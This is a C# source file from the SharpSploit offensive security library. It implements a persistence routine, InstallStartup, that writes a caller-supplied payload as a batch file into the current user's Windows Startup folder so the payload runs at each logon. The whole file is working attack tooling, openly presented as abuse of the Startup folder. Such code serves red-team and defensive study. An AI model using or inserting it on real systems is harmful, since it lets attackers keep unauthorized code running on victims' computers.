// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.IO;

namespace SharpSploit.Persistence
{
    /// <summary>
    /// Startup is a class for abusing the Windows Startup folder to establish peristence.
    /// </summary>
    public class Startup
    {
        /// <summary>
        /// Writes a payload into the current users startup folder.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
        /// <param name="FileName">Defaults to "startup.bat"</param>
        /// <param name="Payload">The payload to run.</param>
        public static bool InstallStartup(string Payload, string FileName = "startup.bat")
        {
            try
            {
                string FilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + $@"\Microsoft\Windows\Start Menu\Programs\Startup\{FileName}";
                File.WriteAllText(FilePath, Payload);

                return true;
            }

            catch (Exception e)
            {
                Console.Error.WriteLine("Failed: " + e.Message);
            }

            return false;
        } 
    }
}
